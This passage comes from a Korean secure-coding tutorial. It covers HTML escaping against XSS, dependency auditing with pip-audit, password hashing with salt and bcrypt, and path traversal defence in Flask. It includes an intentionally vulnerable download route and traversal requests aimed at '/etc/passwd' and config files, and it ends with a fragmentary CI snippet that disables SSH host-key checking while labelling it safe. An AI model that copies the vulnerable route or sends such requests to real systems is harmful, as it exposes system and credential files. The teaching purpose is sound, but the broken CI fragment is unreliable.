# 이스케이프 후: "&lt;script&gt;alert('XSS');&lt;/script&gt;"
# → 브라우저에 "<script>alert('XSS');</script>" 문자열로 표시됨
# → 스크립트 실행 안 됨
```

#### 이스케이프 처리 상세

**HTML 특수 문자 변환표:**

| 원본 | 이스케이프 | 설명 |
|------|-----------|------|
| `<` | `&lt;` | Less than |
| `>` | `&gt;` | Greater than |
| `&` | `&amp;` | Ampersand |
| `"` | `&quot;` | Double quote |
| `'` | `&#x27;` | Single quote |

**예시:**
```python
import html

# 원본
dangerous = '<script>alert("XSS")</script>'

# 이스케이프 후
safe = html.escape(dangerous)
print(safe)
# 출력: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

# 브라우저에서 보이는 것:
# <script>alert("XSS")</script> (그냥 텍스트로 보임)
```

> 🔐 **보안 노트:** 
> 1. **사용자 입력을 HTML에 출력할 때 항상 이스케이프**
> 2. **템플릿 엔진 사용 권장** (Jinja2, Django 템플릿은 자동 이스케이프)
> 3. **Content Security Policy (CSP) 헤더 설정** (추가 방어층)

```python
import subprocess
import json

def check_vulnerabilities():
    """
    프로젝트의 의존성 취약점을 자동으로 점검
    """
    print("🔍 의존성 취약점 검사 시작...")
    
    try:
        # pip-audit 실행
        result = subprocess.run(
            ['pip-audit', '--format', 'json'],
            capture_output=True,
            text=True,
            check=True
        )
        
        # 결과 파싱
        data = json.loads(result.stdout)
        vulnerabilities = data.get('vulnerabilities', [])
        
        if not vulnerabilities:
            print("✅ 취약점이 발견되지 않았습니다!")
            return True
        
        # 취약점 발견 시 상세 정보 출력
        print(f"⚠️ {len(vulnerabilities)}개의 취약점 발견!")
        for vuln in vulnerabilities:
            print(f"\n패키지: {vuln['name']} {vuln['version']}")
            print(f"취약점 ID: {vuln['id']}")
            print(f"심각도: {vuln['severity']}")
            print(f"수정 버전: {vuln['fix_versions']}")
        
        return False
        
    except subprocess.CalledProcessError as e:
        print(f"❌ 검사 실패: {e}")
        return False

# 실행
if __name__ == "__main__":
    is_safe = check_vulnerabilities()
    if not is_safe:
        print("\n⚠️ 취약점을 수정한 후 배포하세요!")
```

> 2. **버전 고정:** 예상치 못한 업데이트로 인한 문제 방지
> 3. **최소 의존성 원칙:** 꼭 필요한 라이브러리만 사용
> 4. **자동화:** GitHub Dependabot 등 자동 취약점 알림 설정

### 8.7 암호화 (Encryption)

#### 평문 저장의 위험성

```python
# ❌ 절대 이렇게 하지 마세요!
users = {
    'john': 'password123',
    'alice': 'qwerty',
    'bob': 'admin1234'
}

def check_login(username, password):
    if username in users and users[username] == password:
        return "로그인 성공"
    return "로그인 실패"
```

**문제점:**
- DB 유출 시 모든 비밀번호 노출
- 내부자 공격에 취약 (관리자가 비밀번호 확인 가능)
- 규정 위반 (GDPR, 개인정보보호법)

#### 💻 해시 암호화 (Hash)

**해시 함수의 특징:**
1. **일방향:** 암호화는 가능하지만 복호화 불가능
2. **결정적:** 같은 입력은 항상 같은 출력
3. **눈사태 효과:** 입력이 조금만 바뀌어도 출력이 완전히 달라짐

```python
import hashlib

# ✅ 해시 함수 사용
def hash_password(password):
    """
    SHA-256 해시 함수로 비밀번호 암호화
    """
    # 문자열을 바이트로 변환 → 해시 → 16진수 문자열로 변환
    hashed = hashlib.sha256(password.encode()).hexdigest()
    return hashed

# 예시
password = "password123"
hashed = hash_password(password)
print(f"원본: {password}")
print(f"해시: {hashed}")

# 출력:
# 원본: password123
# 해시: ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f

# 같은 입력은 항상 같은 해시
print(hash_password("password123"))  # 매번 동일한 결과
```

#### 💻 코드 실행 상세 분석

**1단계: 문자열 → 바이트 변환**
```python
password.encode()
```
- 문자열을 UTF-8 바이트로 변환
- `'password123'` → `b'password123'`

**2단계: 해시 함수 적용**
```python
hashlib.sha256(password.encode())
```
- SHA-256 알고리즘으로 해시 객체 생성
- 256비트(32바이트) 해시값 계산

**3단계: 16진수 문자열로 변환**
```python
.hexdigest()
```
- 바이트를 읽기 쉬운 16진수 문자열로 변환
- 64자리 문자열 생성 (32바이트 × 2)

#### 문제: 레인보우 테이블 공격

**레인보우 테이블:**
- 미리 계산된 해시값 DB
- `"password123"` → `"ef92b778..."`
- 해시를 역으로 검색하여 원본 유추

**해결책: Salt 추가**

```python
import hashlib
import secrets

# ✅ Salt를 사용한 안전한 해시
def hash_password_with_salt(password):
    """
    Salt를 추가하여 더 안전하게 암호화
    """
    # 1. 랜덤 Salt 생성 (16바이트)
    salt = secrets.token_hex(16)
    
    # 2. 비밀번호 + Salt를 결합하여 해시
    salted_password = password + salt
    hashed = hashlib.sha256(salted_password.encode()).hexdigest()
    
    # 3. Salt와 해시를 함께 저장 (구분자: $)
    return f"{salt}${hashed}"

def verify_password(password, stored_hash):
    """
    비밀번호 검증
    """
    # 1. 저장된 Salt와 해시 분리
    salt, hashed = stored_hash.split('$')
    
    # 2. 입력된 비밀번호에 동일한 Salt를 추가하여 해시
    salted_password = password + salt
    new_hash = hashlib.sha256(salted_password.encode()).hexdigest()
    
    # 3. 해시값 비교
    return new_hash == hashed

# 사용 예시
password = "password123"
stored_hash = hash_password_with_salt(password)
print(f"저장되는 값: {stored_hash}")

# 로그인 시도
is_correct = verify_password("password123", stored_hash)
print(f"로그인 성공: {is_correct}")  # True

is_wrong = verify_password("wrong_password", stored_hash)
print(f"잘못된 비밀번호: {is_wrong}")  # False
```

#### 💻 더 강력한 방법: bcrypt

```python
import bcrypt

# ✅ bcrypt 사용 (업계 표준)
def hash_password_bcrypt(password):
    """
    bcrypt로 안전하게 암호화
    """
    # 1. 비밀번호를 바이트로 변환
    password_bytes = password.encode('utf-8')
    
    # 2. Salt 자동 생성 및 해시 (rounds=12)
    hashed = bcrypt.hashpw(password_bytes, bcrypt.gensalt(rounds=12))
    
    return hashed

def verify_password_bcrypt(password, hashed):
    """
    bcrypt로 비밀번호 검증
    """
    password_bytes = password.encode('utf-8')
    return bcrypt.checkpw(password_bytes, hashed)

# 사용 예시
password = "password123"
hashed = hash_password_bcrypt(password)
print(f"bcrypt 해시: {hashed}")

# 검증
print(verify_password_bcrypt("password123", hashed))  # True
print(verify_password_bcrypt("wrong", hashed))        # False
```

**bcrypt의 장점:**
1. **자동 Salt 생성:** 매번 랜덤 Salt 자동 추가
2. **느린 속도:** 무차별 대입 공격(Brute Force) 방어
3. **Adaptive:** rounds 값을 높여 점점 더 느리게 만들 수 있음
4. **업계 표준:** Django, Flask 등 주요 프레임워크가 기본 사용

> 🔐 **보안 노트:** 
> 1. **절대 평문 저장 금지**
> 2. **SHA-256 단독 사용 금지** (너무 빠름 → 무차별 대입 취약)
> 3. **bcrypt, scrypt, Argon2 같은 느린 해시 함수 사용**
> 4. **Salt 필수** (레인보우 테이블 방어)

### 8.8 파일 경로 보안 (Path Traversal 방어)

#### Path Traversal 공격이란?

**공격 시나리오:**
```python
# ❌ 취약한 파일 다운로드 기능
from flask import Flask, send_file, request

app = Flask(__name__)

@app.route('/download')
def download_file():
    filename = request.args.get('file')
    file_path = f'/var/www/uploads/{filename}'
    return send_file(file_path)

# 정상 요청:
# GET /download?file=report.pdf
# → /var/www/uploads/report.pdf 다운로드

# 악의적 요청 (Path Traversal):
# GET /download?file=../../etc/passwd
# → /var/www/uploads/../../etc/passwd
#   = /etc/passwd 다운로드 (시스템 파일 노출!)

# 더 위험한 예:
# GET /download?file=../../app/config.py
# → 애플리케이션 설정 파일(DB 비밀번호 등) 노출
```

#### 💻 안전한 코드 구현

```python
from flask import Flask, send_file, request, abort
import os

app = Flask(__name__)

# ✅ 안전한 파일 다운로드
@app.route('/download')
def download_file_safe():
    filename = request.args.get('file')
    
    # 1. 허용된 디렉토리 정의
    UPLOAD_DIR = '/var/www/uploads'
    
    # 2. 파일 경로 생성
    file_path = os.path.join(UPLOAD_DIR, filename)
    
    # 3. 절대 경로 변환
    abs_file_path = os.path.abspath(file_path)
    abs_upload_dir = os.path.abspath(UPLOAD_DIR)
    
    # 4. 경로 검증 (핵심!)
    if not abs_file_path.startswith(abs_upload_dir):
        abort(403, "허용되지 않은 경로입니다")
    
    # 5. 파일 존재 확인
    if not os.path.exists(abs_file_path):
        abort(404, "파일을 찾을 수 없습니다")
    
    # 6. 디렉토리가 아닌 파일인지 확인
    if not os.path.isfile(abs_file_path):
        abort(403, "파일만 다운로드 가능합니다")
    
    # 7. 안전한 파일 전송
    return send_file(abs_file_path)
```

#### 💻 코드 실행 상세 분석

**공격 시나리오:**
```
요청: /download?file=../../etc/passwd

1단계: 경로 조합
file_path = os.path.join('/var/www/uploads', '../../etc/passwd')
→ /var/www/uploads/../../etc/passwd

2단계: 절대 경로 변환
abs_file_path = os.path.abspath(file_path)
→ /etc/passwd (상대 경로 해석됨)

abs_upload_dir = os.path.abspath('/var/www/uploads')
→ /var/www/uploads

3단계: 경로 검증
abs_file_path.startswith(abs_upload_dir)?
→ "/etc/passwd".startswith("/var/www/uploads")?
→ False!

4단계: 접근 거부
abort(403, "허용되지 않은 경로입니다")
```

**정상 요청:**
```
요청: /download?file=report.pdf

1단계: 경로 조합
file_path = '/var/www/uploads/report.pdf'

2단계: 절대 경로 변환
abs_file_path = '/var/www/uploads/report.pdf'
abs_upload_dir = '/var/www/uploads'

3단계: 경로 검증
"/var/www/uploads/report.pdf".startswith("/var/www/uploads")?
→ True! 통과

4단계: 파일 전송
send_file(abs_file_path)
```

```python
import re

def is_safe_filename(filename):
    """
    파일명 안전성 검증
    """
    # 1. 위험한 문자 검사
    if re.search(r'[<>:"/\\|?*]', filename):
        return False
    
    # 2. 경로 구분자 검사
    if '..' in filename or '/' in filename or '\\' in filename:
        return False
    
    # 3. 숨김 파일 금지
    if filename.startswith('.'):
        return False
    
    # 4. 확장자 화이트리스트
    allowed_extensions = {'.pdf', '.jpg', '.png', '.docx'}
    _, ext = os.path.splitext(filename)
    if ext.lower() not in allowed_extensions:
        return False
    
    return True

# 사용
@app.route('/download')
def download_file_safer():
    filename = request.args.get('file')
    
    # 파일명 검증
    if not is_safe_filename(filename):
        abort(400, "유효하지 않은 파일명입니다")
    
    # ... 나머지 코드 동일
```

> 1. **절대 경로 검증 필수** (`os.path.abspath` + `startswith` 확인)
> 2. **화이트리스트 방식** (허용된 경로만 접근 가능)
> 3. **파일명 검증** (특수 문자, 경로 구분자 차단)

```yaml
  push:
```

```yaml
jobs:
  test:

      - name: Upload coverage to Codecov

    needs: test  # test가 성공해야 실행

        run: |

          mkdir -p ~/.ssh
          echo "$SSH_PRIVATE_KEY" > ~/.ssh/id_rsa
          chmod 600 ~/.ssh/id_rsa
          
          # 안전한 SSH 접속
          ssh -o StrictHostKeyChecking=no user@server.com << 'EOF'

            git pull
```
